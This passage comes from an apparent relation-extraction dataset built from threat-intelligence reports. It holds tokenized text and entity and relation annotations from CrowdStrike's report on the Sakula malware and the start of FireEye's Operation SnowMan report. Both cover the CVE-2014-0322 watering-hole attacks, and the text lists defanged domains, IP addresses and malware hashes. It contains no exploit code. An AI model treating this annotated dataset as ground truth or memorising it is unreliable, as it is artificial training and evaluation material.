"evidence": [37]}, {"r": "P21", "h": 50, "t": 46, "evidence": [37]}], "title": "201402CrowdStrikeSakula", "sents": [["The", "French", "Connection", ":", "French", "Aerospace", "-", "Focused", "CVE-2014", "-", "0322", "Attack", "Shares", "Similarities", "with", "2012"], ["Capstone", "Turbine", "Activity"], ["THE", "ADVERSARY", "LINE", "-", "UP", "25", "FEB", "2014", "MATT", "DAHL", "Two", "weeks", "ago", ",", "news", "broke", "about", "strategic", "web", "compromise", "(", "SWC", ")", "activity", "on", "the", "website", "for", "the", "U.S.", "organization", ",", "Veterans", "of", "Foreign", "Wars", "(", "VFW", ")", "."], ["This", "activity", "leveraged", "exploit", "code", "for", "a", "zero", "-", "day", "vulnerability", "now", "identi\ufb01ed", "as", "CVE-2014", "-", "0322", "and", "ultimately", "infected", "victims", "with", "ZxShell", "malware", "."], ["CrowdStrike", "Intelligence", "attributed", "this", "attack", "to", "the", "AURORA", "PANDA", "adversary", ";", "however", ",", "the", "discovery", "of", "additional", "indicators", "revealed", "that", "another", "adversary", "was", "leveraging", "the", "same", "vulnerability", "to", "carry", "out", "targeted", "attacks", "nearly", "a", "month", "before", "the", "VFW", "attack", "occurred", "."], ["This", "other", "activity", "appears", "to", "be", "focused", "on", "French", "aerospace", "and", "shares", "similarities", "with", "a", "2012", "SWC", "campaign", "affecting", "the", "website", "of", "U.S.-based", "turbine", "manufacturer", ",", "Capstone", "Turbine", "."], ["GIFAS", "-", "Related", "Activity", "CrowdStrike", "Intelligence", "became", "aware", "of", "this", "additional", "activity", "after", "learning", "of", "a", "malicious", "iframe", "located", "at", "savmpet[.]com", "."], ["The", "iframe", "redirected", "visitors", "to", "gifas[.]assso[.]net", ",", "which", "was", "hosting", "exploit", "code", "in", "two", "\ufb01les", "(", "include.html", "and", "Tope.swf", ")", "as", "well", "as", "a", "malicious", "payload", "(", "Erido.jpg", ")", "."], ["Above", "are", "screenshots", "of", "the", "savmpet[.]com", "webpage", "and", "part", "of", "the", "page", "source", "showing", "the", "date", "that", "it", "was", "last", "modi\ufb01ed", "and", "the", "iframe", "redirect", "."], ["The", "content", "of", "the", "page", "was", "taken", "from", "the", "website", "of", "the", "French", "aerospace", "industries", "association", ",", "Groupement", "des", "industries", "fran\u00e7aises", "a\u00e9ronautiques", "et", "spatiales", "(", "GIFAS", ")", "."], ["The", "17", "January", "2014", "date", "on", "both", "the", "webpage", "and", "the", "page", "source", "shows", "that", "it", "was", "created", "nearly", "a", "month", "before", "the", "VFW", "attack", "occurred", "Victim", "exploitation", "occurred", "in", "the", "same", "manner", "as", "in", "the", "VFW", "activity", ",", "but", "the", "payload", "was", "different", "."], ["Instead", "of", "ZxShell", "malware", "connecting", "to", "AURORA", "PANDA", "-", "related", "infrastructure", ",", "it", "was", "a", "malware", "variant", "known", "as", "Sakula", "connecting", "to", "command", "-", "and", "-", "control", "(", "C2", ")", "infrastructure", "at", "oa[.]ameteksen[.]com", "."], ["French", "Aerospace", "Focus"], ["This", "attack", "\u2019s", "most", "obvious", "connection", "to", "French", "aerospace", "is", "the", "content", "taken", "from", "the", "GIFAS", "website", "and", "the", "GIFAS", "-", "based", "domain", "used", "to", "host", "the", "exploit", "code", "and", "payload", "(", "gifas[.]assso[.]net", ")", "."], ["However", ",", "a", "more", "in", "-", "depth", "look", "reveals", "additional", "connections", "."], ["First", "is", "the", "IP", "address", "173.252.252.204", ",", "which", "hosted", "both", "savmpet[.]com", "and", "gifas[.]assso[.]net", "."], ["Several", "other", "domains", "were", "also", "pointed", "at", "this", "IP", "during", "the", "same", "time", "frame", ",", "including", "two", "that", "contained", "the", "same", "content", "and", "malicious", "iframe", "as", "savmpet[.]com", ",", "secure[.]safran", "-", "group[.]com", ",", "and", "icbcqsz[.]com", "."], ["Of", "particular", "interest", "was", "secure[.]safran", "-", "group[.]com", "."], ["Safran", "is", "a", "France", "-", "based", "aerospace", "and", "defense", "company", "with", "a", "focus", "on", "the", "design", "and", "production", "of", "aircraft", "engines", "and", "equipment", "."], ["The", "company", "owns", "the", "safran", "-", "group[.]com", "domain", ",", "and", "the", "fact", "that", "one", "of", "its", "subdomains", "was", "pointed", "at", "a", "malicious", "IP", "address", "suggests", "that", "the", "adversary", "compromised", "Safran", "\u2019s", "DNS", "."], ["The", "Sakula", "malware", "used", "in", "this", "attack", "contained", "an", "unusual", "and", "interesting", "component", "that", "further", "indicates", "a", "focus", "on", "French", "aerospace", "."], ["As", "part", "of", "the", "infection", "process", ",", "it", "added", "a", "number", "of", "domains", "to", "the", "\u201c", "host", "\u2019s", "\u201d", "\ufb01le", "of", "victim", "machines", "."], ["The", "snecma[.]fr", "domain", "belongs", "to", "the", "Safran", "subsidiary", ",", "Snecma", ",", "that", "designs", "and", "builds", "engines", "for", "civilian", "and", "military", "aircraft", ",", "and", "spacecraft", "."], ["The", "domains", "listed", "appear", "to", "provide", "remote", "access", "to", "the", "company", "\u2019s", "employees", "and", "possibly", "third", "-", "party", "contractors", "."], ["The", "purpose", "of", "this", "component", "is", "unclear", "."], ["It", "does", "not", "map", "these", "domains", "to", "malicious", "IP", "addresses", "because", "the", "217.108.170.0/24", "range", "belongs", "to", "the", "company", ",", "which", "means", "it", "is", "not", "meant", "to", "send", "victims", "directly", "to", "adversary", "infrastructure", "for", "credential", "collection", "."], ["One", "possibility", "is", "that", "it", "was", "meant", "to", "make", "the", "malware", "appear", "more", "legitimate", "."], ["It", "has", "also", "been", "hypothesized", "that", "this", "was", "done", "to", "ensure", "DNS", "connectivity", "to", "these", "particular", "domains", ";", "however", ",", "it", "seems", "unlikely", "that", "victims", "would", "suffer", "signi\ufb01cant", "DNS", "connectivity", "issues", ",", "which", "means", "that", "adding", "this", "component", "to", "the", "malware", "for", "that", "purpose", "would", "be", "somewhat", "super\ufb02uous", "."], ["It", "should", "be", "noted", "that", "no", "victim", "logs", "related", "to", "this", "attack", "were", "discovered", ",", "so", "it", "is", "unclear", "who", "the", "actual", "targets", "and", "victims", "were", "."], ["Having", "the", "secure[.]safran", "-", "group[.]com", "domain", "pointed", "at", "a", "malicious", "IP", "indicates", "that", "Safran", "suffered", "a", "DNS", "compromise", ",", "but", "no", "deeper", "network", "compromise", "was", "observed", "."], ["It", "is", "possible", "that", "the", "adversary", "desired", "to", "target", "the", "French", "aerospace", "and", "defense", "sectors", "broadly", ",", "or", "possibly", "organizations", "in", "these", "sectors", "globally", "."], ["Similarities", "to", "2012", "Capstone", "Turbine", "SWC", "Attack"], ["In", "January", "2013", ",", "it", "was", "reported", "that", "the", "website", "for", "U.S.-based", "turbine", "manufacturer", ",", "Capstone", "Turbine", ",", "had", "been", "compromised", "and", "was", "being", "used", "in", "a", "SWC", "attack", "leveraging", "an", "exploit", "for", "the", "CVE-2012", "-", "4792", "."], ["There", "are", "three", "primary", "similarities", "between", "the", "Capstone", "Turbine", "attack", "and", "the", "recent", "French", "aerospace", "activity", "."], ["The", "\ufb01rst", ",", "and", "most", "signi\ufb01cant", ",", "connection", "is", "the", "use", "of", "Sakula", "malware", "."], ["In", "both", "campaigns", ",", "Sakula", "variants", "were", "installed", "on", "successfully", "exploited", "machines", "."], ["In", "Capstone", "Turbine", ",", "the"], ["Sakula", "sample", "used", "(", "MD5", "hash", ":", "61fe6f4cb2c54511f0804b1417ab3bd2", ")", "connected", "to", "web[.]vipreclod[.]com", ",", "and", "in", "the", "recent", "attack", ",", "the", "sample", "(", "MD5", "hash", ":", "c869c75ed1998294af3c676bdbd56851", ")", "connected", "to", "oa[.]ameteksen[.]com", "."], ["Use", "of", "this", "malware", "does", "n\u2019t", "appear", "to", "be", "widespread", ",", "but", "it", "is", "not", "yet", "clear", "whether", "only", "one", "group", "uses", "it", ",", "and", "therefore", "its", "use", "alone", "does", "not", "necessarily", "indicate", "a", "particular", "adversary", "."], ["Another", "similarity", "is", "that", "GIFAS", "-", "based", "malicious", "domains", "are", "related", "to", "each", "incident", "."], ["In", "the", "more", "recent", "attack", ",", "the", "gifas[.]assso[.]net", "domain", "was", "used", "to", "host", "exploit", "code", "and", "the", "malicious", "payload", "."], ["The", "Capstone", "Turbine", "incident", "did", "not", "directly", "use", "a", "GIFAS", "-", "based", "domain", ",", "but", "a", "deeper", "look", "at", "network", "indicators", "related", "to", "those", "observed", "in", "the", "Capstone", "incident", "reveals", "two", "such", "domains", ":", "gifas[.]cechire[.]com", "and", "gifas[.]blogsite[.]org", "."], ["The", "third", "similarity", "between", "the", "two", "is", "the", "use", "of", "zero", "-", "days", "."], ["The", "exploit", "used", "in", "Capstone", "Turbine", "was", "a", "zero", "-", "day", "during", "the", "time", "it", "was", "active", ",", "just", "like", "the", "exploit", "used", "in", "the", "recent", "French", "aerospace", "activity", "."], ["This", "is", "a", "general", "similarity", "that", "does", "not", "create", "a", "de\ufb01nitive", "link", "between", "the", "two", "attacks", ",", "but", "when", "viewed", "in", "conjunction", "with", "the", "use", "of", "the", "same", "malware", "and", "GIFAS", "-", "based", "domains", ",", "it", "strengthens", "the", "connection", "."], ["\u2190"], ["Mo", "\u2019", "Shells", "Mo", "\u2019", "Problems", "\u2013", "File", "List"], ["Stacking", "Details", "about", "Apple", "SSL", "vulnerability", "and", "iOS", "7.0.6", "patch", "\u2192", "Follow", "Us", "Tweets", "about", "\"", "from", ":", "crowdstrike", "OR", "from", ":"], ["Adam_Cyber", "OR", "from", ":", "JMDeC", "OR", "from", ":", "DmitriCyber", "OR", "from", ":", "StevenChabinsky", "OR", "from", ":", "George_Kurtz", "\"", "Recent", "Posts"], ["The", "Imperative", "for", "Proactive", "Incident", "Response", "in", "2015", "and", "Beyond"], ["November", "3", ",", "2015", "Why", "Your", "Business", "Environment", "Should", "Drive", "Cybersecurity", "November", "2", ",", "2015", "Blurring", "of", "Commodity", "and", "Targeted", "Attack", "Malware", "October", "16", ",", "2015"], ["Should", "I", "Really", "Trust", "the", "Cloud", "with", "my", "Endpoint", "Protection", "?"], ["September", "30", ",", "2015", "U.S."], ["\u2013", "China", "Agreement", "on", "Cyber", "Intrusions", ":", "An", "In\ufb02ection", "Point", "September", "25", ",", "2015", "Archives", "N", "M", "T", "W", "O", "V", "T", "E", "M", "B", "E", "F", "R", "2", "S", "0", "1", "5"], ["S", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "\u00ab", "Oct", "Recent", "Comments"]]}, {"vertexSet": [[{"name": "SnowMan", "pos": [1, 2], "sent_id": 0, "type": "Campaign"}], [{"name": "US Veterans", "pos": [6, 8], "sent_id": 0, "type": "ExploitTargetObject"}], [{"name": "CVE-2014-0322", "pos": [12, 15], "sent_id": 1, "type": "Vulnerability"}], [{"name": "U.S. Veterans of Foreign Wars\u2019 website", "pos": [21, 28], "sent_id": 1, "type": "ExploitTargetObject"}], [{"name": "vfw[.]org", "pos": [29, 30], "sent_id": 1, "type": "ExploitTargetObject"}], [{"name": "American military personnel", "pos": [10, 13], "sent_id": 2, "type": "ExploitTargetObject"}], [{"name": "DeputyDog", "pos": [24, 25], "sent_id": 3, "type": "Campaign"}], [{"name": "Ephemeral Hydra", "pos": [27, 29], "sent_id": 3, "type": "Campaign"}], [{"name": "IE 10", "pos": [7, 9], "sent_id": 9, "type": "Software"}], [{"name": "www.[REDACTED].com/Data/img/img.html", "pos": [17, 24], "sent_id": 10, "type": "Indicator"}], [{"name": "IE 10", "pos": [3, 5], "sent_id": 12, "type": "Software"}], [{"name": "Adobe Flash", "pos": [6, 8], "sent_id": 12, "type": "Software"}], [{"name": "Microsoft\u2019s Experience Mitigation Toolkit", "pos": [17, 22], "sent_id": 13, "type": "CourseOfAction"}], [{"name": "updating to IE 11", "pos": [4, 8], "sent_id": 14, "type": "CourseOfAction"}], [{"name": "Flash ActionScript", "pos": [5, 7], "sent_id": 19, "type": "Exploit"}], [{"name": "return-oriented programing", "pos": [3, 7], "sent_id": 20, "type": "Exploit"}], [{"name": "Microsoft.XMLDOM ActiveX control", "pos": [4, 9], "sent_id": 22, "type": "Exploit"}], [{"name": "corrupts a Flash Vector object", "pos": [5, 10], "sent_id": 27, "type": "Exploit"}], [{"name": "XOR key of 0\u00d795", "pos": [26, 30], "sent_id": 40, "type": "Obfuscation"}], [{"name": "sqlrenew.txt", "pos": [13, 14], "sent_id": 42, "type": "Payload"}], [{"name": "stream.exe", "pos": [17, 18], "sent_id": 42, "type": "Payload"}], [{"name": "ZxShell", "pos": [16, 17], "sent_id": 46, "type": "Malware"}], [{"name": "8455bbb9a210ce603a1b646b0d951bce", "pos": [21, 22], "sent_id": 46, "type": "MD5"}], [{"name": "2014-02-11", "pos": [7, 12], "sent_id": 47, "type": "Time"}], [{"name": "2014-02-11", "pos": [24, 29], "sent_id": 47, "type": "Time"}], [{"name": "SnowMan", "pos": [5, 6], "sent_id": 49, "type": "Campaign"}], [{"name": "ZxShell", "pos": [1, 2], "sent_id": 52, "type": "Malware"}], [{"name": "newss[.]effers[.]com", "pos": [13, 14], "sent_id": 53, "type": "Indicator"}], [{"name": "118.99.60.142", "pos": [5, 6], "sent_id": 54, "type": "Address"}], [{"name": "info[.]flnet[.]org", "pos": [2, 3], "sent_id": 55, "type": "Indicator"}], [{"name": "2014-02-12", "pos": [10, 15], "sent_id": 55, "type": "Time"}], [{"name": "info[.]flnet[.]org", "pos": [1, 2], "sent_id": 57, "type": "Indicator"}], [{"name": "icybin[.]flnet[.]org", "pos": [5, 6], "sent_id": 57, "type": "Indicator"}], [{"name": "book[.]flnet[.]org", "pos": [7, 8], "sent_id": 57, "type": "Indicator"}], [{"name": "58.64.200.178", "pos": [18, 19], "sent_id": 57, "type": "Address"}], [{"name": "58.64.200.179", "pos": [0, 1], "sent_id": 58, "type": "Address"}], [{"name": "103.20.192.4", "pos": [1, 2], "sent_id": 58, "type": "Address"}], [{"name": "2013-08-31", "pos": [2, 7], "sent_id": 59, "type": "Time"}], [{"name": "2013-05-02", "pos": [7, 12], "sent_id": 59, "type": "Time"}], [{"name": "2013-08-02", "pos": [12, 17], "sent_id": 59, "type": "Time"}], [{"name": "2013-08-10", "pos": [17, 22], "sent_id": 59, "type": "Time"}], [{"name": "2013-07-15", "pos": [22, 27], "sent_id": 59, "type": "Time"}], [{"name": "2014-01-02", "pos": [27, 32], "sent_id": 59, "type": "Time"}], [{"name": "2013-12-03", "pos": [32, 37], "sent_id": 59, "type": "Time"}], [{"name": "2013-08-31", "pos": [39, 44], "sent_id": 59, "type": "Time"}], [{"name": "2013-08-02", "pos": [44, 49], "sent_id": 59, "type": "Time"}], [{"name": "2013-08-02", "pos": [49, 54], "sent_id": 59, "type": "Time"}], [{"name": "2013-08-10", "pos": [54, 59], "sent_id": 59, "type": "Time"}], [{"name": "2013-07-15", "pos": [59, 64], "sent_id": 59, "type": "Time"}], [{"name": "2014-01-02", "pos": [64, 69], "sent_id": 59, "type": "Time"}], [{"name": "2014-01-02", "pos": [69, 74], "sent_id": 59, "type": "Time"}], [{"name": "icybin.flnet[.]org", "pos": [76, 77], "sent_id": 59, "type": "Indicator"}], [{"name": "info.flnet[.]org", "pos": [77, 78], "sent_id": 59, "type": "Indicator"}], [{"name": "book.flnet[.]org", "pos": [0, 1], "sent_id": 60, "type": "Indicator"}], [{"name": "info.flnet[.]org", "pos": [1, 2], "sent_id": 60, "type": "Indicator"}], [{"name": "icybin.flnet[.]org", "pos": [2, 3], "sent_id": 60, "type": "Indicator"}], [{"name": "book.flnet[.]org", "pos": [3, 4], "sent_id": 60, "type": "Indicator"}], [{"name": "info.flnet[.]org", "pos": [4, 5], "sent_id": 60, "type": "Indicator"}], [{"name": "58.64.200.178", "pos": [1, 2], "sent_id": 61, "type": "Address"}], [{"name": "58.64.200.178", "pos": [0, 1], "sent_id": 62, "type": "Address"}], [{"name": "58.64.200.178", "pos": [0, 1], "sent_id": 63, "type": "Address"}], [{"name": "58.64.200.179", "pos": [0, 1], "sent_id": 64, "type": "Address"}], [{"name": "58.64.200.179", "pos": [1, 2], "sent_id": 64, "type": "Address"}], [{"name": "103.20.192.4", "pos": [2, 3], "sent_id": 64, "type": "Address"}], [{"name": "103.20.192.4", "pos": [3, 4], "sent_id": 64, "type": "Address"}], [{"name": "Gh0stRat", "pos": [7, 8], "sent_id": 64, "type": "Malware"}], [{"name": "book[.]flnet[.]org", "pos": [20, 21], "sent_id": 64, "type": "Indicator"}], [{"name": "icybin[.]flnet[.]org", "pos": [22, 23], "sent_id": 64, "type": "Indicator"}], [{"name": "DeputyDog", "pos": [6, 7], "sent_id": 65, "type": "Campaign"}], [{"name": "Gh0st", "pos": [16, 17], "sent_id": 65, "type": "Malware"}], [{"name": "Gh0st", "pos": [7, 8], "sent_id": 66, "type": "Malware"}], [{"name": "me[.]scieron[.]com", "pos": [18, 19], "sent_id": 66, "type": "Indicator"}], [{"name": "758886e58f9ea2ff22b57cbbb015166e", "pos": [4, 5], "sent_id": 67, "type": "MD5"}], [{"name": "book.flnet[.]org", "pos": [5, 6], "sent_id": 67, "type": "Indicator"}], [{"name": "0294f9280491f85d898ebe471f0fb58e", "pos": [6, 7], "sent_id": 67, "type": "MD5"}], [{"name": "icybin.flnet[.]org", "pos": [7, 8], "sent_id": 67, "type": "Indicator"}], [{"name": "9d20566a327076b7152bbf9ed20292c4", "pos": [8, 9], "sent_id": 67, "type": "MD5"}], [{"name": "me.scieron[.]com", "pos": [9, 10], "sent_id": 67, "type": "Indicator"}], [{"name": "me[.]scieron[.]com", "pos": [1, 2], "sent_id": 68, "type": "Indicator"}], [{"name": "58.64.199.22", "pos": [6, 7], "sent_id": 68, "type": "Address"}], [{"name": "book[.]flnet[.]org", "pos": [1, 2], "sent_id": 69, "type": "Indicator"}], [{"name": "58.64.199.0", "pos": [12, 13], "sent_id": 69, "type": "Address"}], [{"name": "book[.]flnet[.]org", "pos": [2, 3], "sent_id": 70, "type": "Indicator"}], [{"name": "58.64.199.27", "pos": [6, 7], "sent_id": 70, "type": "Address"}], [{"name": "dll[.]freshdns[.]org", "pos": [10, 11], "sent_id": 71, "type": "Indicator"}], [{"name": "ali[.]blankchair[.]com", "pos": [12, 13], "sent_id": 71, "type": "Indicator"}], [{"name": "cht[.]blankchair[.]com", "pos": [15, 16], "sent_id": 71, "type": "Indicator"}], [{"name": "dll[.]freshdns[.]org", "pos": [2, 3], "sent_id": 72, "type": "Indicator"}], [{"name": "58.64.199.25", "pos": [5, 6], "sent_id": 72, "type": "Address"}], [{"name": "ali[.]blankchair[.]com", "pos": [0, 1], "sent_id": 74, "type": "Indicator"}], [{"name": "cht[.]blankchair[.]com", "pos": [2, 3], "sent_id": 74, "type": "Indicator"}], [{"name": "58.64.199.22", "pos": [5, 6], "sent_id": 74, "type": "Address"}], [{"name": "2012-11-12", "pos": [7, 12], "sent_id": 75, "type": "Time"}], [{"name": "2012-04-09", "pos": [12, 17], "sent_id": 75, "type": "Time"}], [{"name": "2012-04-09", "pos": [17, 22], "sent_id": 75, "type": "Time"}], [{"name": "2012-11-08", "pos": [0, 5], "sent_id": 76, "type": "Time"}], [{"name": "2012-11-23", "pos": [5, 10], "sent_id": 76, "type": "Time"}], [{"name": "2012-05-29", "pos": [10, 15], "sent_id": 76, "type": "Time"}], [{"name": "2012-11-28", "pos": [15, 20], "sent_id": 76, "type": "Time"}], [{"name": "2012-10-24", "pos": [20, 25], "sent_id": 76, "type": "Time"}], [{"name": "2012-09-18", "pos": [25, 30], "sent_id": 76, "type": "Time"}], [{"name": "2012-11-25", "pos": [30, 35], "sent_id": 76, "type": "Time"}], [{"name": "2012-11-27", "pos": [35, 40], "sent_id": 76, "type": "Time"}], [{"name": "2012-6-28", "pos": [40, 45], "sent_id": 76, "type": "Time"}], [{"name": "me.scieron[.]com", "pos": [45, 46], "sent_id": 76, "type": "Indicator"}], [{"name": "58.64.199.22", "pos": [0, 1], "sent_id": 77, "type": "Address"}], [{"name": "cht.blankchair[.]com", "pos": [0, 1], "sent_id": 78, "type": "Indicator"}], [{"name": "58.64.199.22", "pos": [1, 2], "sent_id": 78, "type": "Address"}], [{"name": "ali.blankchair[.]com", "pos": [2, 3], "sent_id": 78, "type": "Indicator"}], [{"name": "58.64.199.22", "pos": [0, 1], "sent_id": 79, "type": "Address"}], [{"name": "dll.freshdns[.]org", "pos": [1, 2], "sent_id": 79, "type": "Indicator"}], [{"name": "58.64.199.25", "pos": [0, 1], "sent_id": 80, "type": "Address"}], [{"name": "rt.blankchair[.]com", "pos": [0, 1], "sent_id": 81, "type": "Indicator"}], [{"name": "58.64.199.25", "pos": [1, 2], "sent_id": 81, "type": "Address"}], [{"name": "book.flnet[.]org", "pos": [2, 3], "sent_id": 81, "type": "Indicator"}], [{"name": "58.64.199.27", "pos": [0, 1], "sent_id": 82, "type": "Address"}], [{"name": "DeputyDog", "pos": [23, 24], "sent_id": 84, "type": "Campaign"}], [{"name": "Ephemeral Hydra", "pos": [25, 27], "sent_id": 84, "type": "Campaign"}], [{"name": "dll[.]freshdns[.]org", "pos": [4, 5], "sent_id": 85, "type": "Indicator"}], [{"name": "ali[.]blankchair[.]com", "pos": [6, 7], "sent_id": 85, "type": "Indicator"}], [{"name": "cht[.]blankchair[.]com", "pos": [8, 9], "sent_id": 85, "type": "Indicator"}], [{"name": "DeputyDog", "pos": [15, 16], "sent_id": 85, "type": "Campaign"}], [{"name": "Ephemeral Hydra", "pos": [18, 20], "sent_id": 85, "type": "Campaign"}], [{"name": "U.S. government entities", "pos": [13, 16], "sent_id": 99, "type": "ExploitTargetObject"}], [{"name": "Japanese firms", "pos": [16, 18], "sent_id": 99, "type": "ExploitTargetObject"}], [{"name": "Defense industrial base", "pos": [18, 21], "sent_id": 99, "type": "ExploitTargetObject"}], [{"name": "DIB", "pos": [22, 23], "sent_id": 99, "type": "ExploitTargetObject"}], [{"name": "Law firms", "pos": [0, 2], "sent_id": 100, "type": "ExploitTargetObject"}], [{"name": "Information technology", "pos": [2, 4], "sent_id": 100, "type": "ExploitTargetObject"}], [{"name": "IT", "pos": [5, 6], "sent_id": 100, "type": "ExploitTargetObject"}], [{"name": "Mining companies", "pos": [0, 2], "sent_id": 101, "type": "ExploitTargetObject"}], [{"name": "Non-governmental organizations", "pos": [0, 4], "sent_id": 102, "type": "ExploitTargetObject"}], [{"name": "NGOs", "pos": [5, 6], "sent_id": 102, "type": "ExploitTargetObject"}]], "labels": [{"r": "P19", "h": 8, "t": 2, "evidence": [1, 9]}, {"r": "P33", "h": 25, "t": 24, "evidence": [47, 49]}, {"r": "P33", "h": 25, "t": 23, "evidence": [47, 49]}, {"r": "P22", "h": 25, "t": 21, "evidence": [46, 49]}, {"r": "P21", "h": 22, "t": 21, "evidence": [46]}, {"r": "P21", "h": 27, "t": 26, "evidence": [52, 53]}, {"r": "P28", "h": 26, "t": 28, "evidence": [52, 54]}, {"r": "P21", "h": 29, "t": 26, "evidence": [52, 55]}, {"r": "P33", "h": 26, "t": 30, "evidence": [52, 55]}, {"r": "P21", "h": 67, "t": 65, "evidence": [64]}, {"r": "P21", "h": 66, "t": 65, "evidence": [64]}, {"r": "P22", "h": 68, "t": 69, "evidence": [65]}, {"r": "P21", "h": 71, "t": 70, "evidence": [66]}, {"r": "P21", "h": 72, "t": 65, "evidence": [64, 67]}, {"r": "P21", "h": 74, "t": 65, "evidence": [64, 67]}, {"r": "P21", "h": 76, "t": 65, "evidence": [64, 67]}, {"r": "P21", "h": 73, "t": 65, "evidence": [64, 67]}, {"r": "P21", "h": 75, "t": 65, "evidence": [64, 67]}, {"r": "P21", "h": 77, "t": 65, "evidence": [64, 67]}, {"r": "P21", "h": 78, "t": 65, "evidence": [64, 68]}, {"r": "P21", "h": 80, "t": 65, "evidence": [64, 69]}, {"r": "P21", "h": 82, "t": 65, "evidence": [64, 70]}, {"r": "P21", "h": 84, "t": 65, "evidence": [64, 71]}, {"r": "P21", "h": 85, "t": 65, "evidence": [64, 71]}, {"r": "P21", "h": 86, "t": 65, "evidence": [64, 71]}, {"r": "P21", "h": 87, "t": 65, "evidence": [64, 72]}, {"r": "P21", "h": 89, "t": 65, "evidence": [64, 74]}, {"r": "P21", "h": 90, "t": 65, "evidence": [64, 74]}, {"r": "P21", "h": 104, "t": 65, "evidence": [64, 76]}, {"r": "P21", "h": 106, "t": 65, "evidence": [64, 78]}, {"r": "P21", "h": 108, "t": 65, "evidence": [64, 78]}, {"r": "P21", "h": 110, "t": 65, "evidence": [64, 79]}, {"r": "P21", "h": 112, "t": 65, "evidence": [64, 81]}, {"r": "P21", "h": 114, "t": 65, "evidence": [64, 81]}, {"r": "P21", "h": 118, "t": 65, "evidence": [64, 85]}, {"r": "P28", "h": 65, "t": 79, "evidence": [64, 68]}, {"r": "P28", "h": 65, "t": 81, "evidence": [64, 69]}, {"r": "P28", "h": 65, "t": 83, "evidence": [64, 70]}, {"r": "P28", "h": 65, "t": 88, "evidence": [64, 72]}, {"r": "P28", "h": 65, "t": 91, "evidence": [64, 74]}, {"r": "P28", "h": 65, "t": 105, "evidence": [64, 77]}, {"r": "P28", "h": 65, "t": 107, "evidence": [64, 78]}, {"r": "P28", "h": 65, "t": 109, "evidence": [64, 79]}, {"r": "P28", "h": 65, "t": 111, "evidence": [64, 80]}, {"r": "P28", "h": 65, "t": 113, "evidence": [64, 81]}, {"r": "P28", "h": 65, "t": 115, "evidence": [64, 82]}, {"r": "P28", "h": 26, "t": 58, "evidence": [52, 61]}, {"r": "P28", "h": 26, "t": 59, "evidence": [52, 62]}, {"r": "P28", "h": 26, "t": 60, "evidence": [52, 63]}, {"r": "P28", "h": 26, "t": 61, "evidence": [52, 64]}, {"r": "P28", "h": 26, "t": 62, "evidence": [52, 64]}, {"r": "P28", "h": 26, "t": 63, "evidence": [52, 64]}, {"r": "P28", "h": 26, "t": 64, "evidence": [52, 64]}, {"r": "P28", "h": 26, "t": 34, "evidence": [52, 57]}, {"r": "P28", "h": 26, "t": 35, "evidence": [52, 58]}, {"r": "P28", "h": 26, "t": 36, "evidence": [52, 58]}, {"r": "P33", "h": 0, "t": 37, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 38, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 39, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 40, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 41, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 42, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 43, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 44, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 45, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 46, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 47, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 48, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 49, "evidence": [0, 59]}, {"r": "P33", "h": 0, "t": 50, "evidence": [0, 59]}, {"r": "P21", "h": 51, "t": 26, "evidence": [52, 59]}, {"r": "P21", "h": 52, "t": 26, "evidence": [52, 59]}, {"r": "P21", "h": 53, "t": 26, "evidence": [52, 60]}, {"r": "P21", "h": 54, "t": 26, "evidence": [52, 60]}, {"r": "P21", "h": 55, "t": 26, "evidence": [52, 60]}, {"r": "P21", "h": 56, "t": 26, "evidence": [52, 60]}, {"r": "P21", "h": 57, "t": 26, "evidence": [52, 60]}], "title": "201402FireEyeSnowMan", "sents": [["Operation", "SnowMan", ":", "DeputyDog", "Actor", "Compromises", "US", "Veterans", "of", "Foreign", "Wars", "Website"], ["On", "February", "11", ",", "FireEye", "identified", "a", "zero", "-", "day", "exploit", "(", "CVE-2014", "-", "0322", ")", "being", "served", "up", "from", "the", "U.S.", "Veterans", "of", "Foreign", "Wars", "\u2019", "website", "(", "vfw[.]org", ")", "."], ["We", "believe", "the", "attack", "is", "a", "strategic", "Web", "compromise", "targeting", "American", "military", "personnel", "amid", "a", "paralyzing", "snowstorm", "at", "the", "U.S.", "Capitol", "in", "the", "days", "leading", "up", "to", "the", "Presidents", "Day", "holiday", "weekend", "."], ["Based", "on", "infrastructure", "overlaps", "and", "tradecraft", "similarities", ",", "we", "believe", "the", "actors", "behind", "this", "campaign", "are", "associated", "with", "two", "previously", "identified", "campaigns", "(", "Operation", "DeputyDog", "and", "Operation", "Ephemeral", "Hydra", ")", "."], ["This", "blog", "post", "examines", "the", "vulnerability", "and", "associated", "attacks", ",", "which", "we", "have", "dubbed", "\u201c", "Operation", "SnowMan", ".", "\u201d"], ["Exploit", "/", "Delivery", "analysis"], ["After", "compromising", "the", "VFW", "website", ",", "the", "attackers", "added", "an", "iframe", "into", "the", "beginning", "of", "the", "website", "\u2019s", "HTML", "code", "that", "loads", "the", "attacker", "\u2019s", "page", "in", "the", "background", "."], ["The", "attacker", "\u2019s", "HTML", "/", "JavaScript", "page", "runs", "a"], ["Flash", "object", ",", "which", "orchestrates", "the", "remainder", "of", "the", "exploit", "."], ["The", "exploit", "includes", "calling", "back", "to", "the", "IE", "10", "vulnerability", "trigger", ",", "which", "is", "embedded", "in", "the", "JavaScript", "."], ["Specifically", ",", "visitors", "to", "the", "VFW", "website", "were", "silently", "redirected", "through", "an", "iframe", "to", "the", "exploit", "at", "www.[REDACTED].com", "/", "Data", "/", "img", "/", "img.html", "."], ["Mitigation"], ["The", "exploit", "targets", "IE", "10", "with", "Adobe", "Flash", "."], ["It", "aborts", "exploitation", "if", "the", "user", "is", "browsing", "with", "a", "different", "version", "of", "IE", "or", "has", "installed", "Microsoft", "\u2019s", "Experience", "Mitigation", "Toolkit", "(", "EMET", ")", "."], ["So", "installing", "EMET", "or", "updating", "to", "IE", "11", "prevents", "this", "exploit", "from", "functioning", "."], 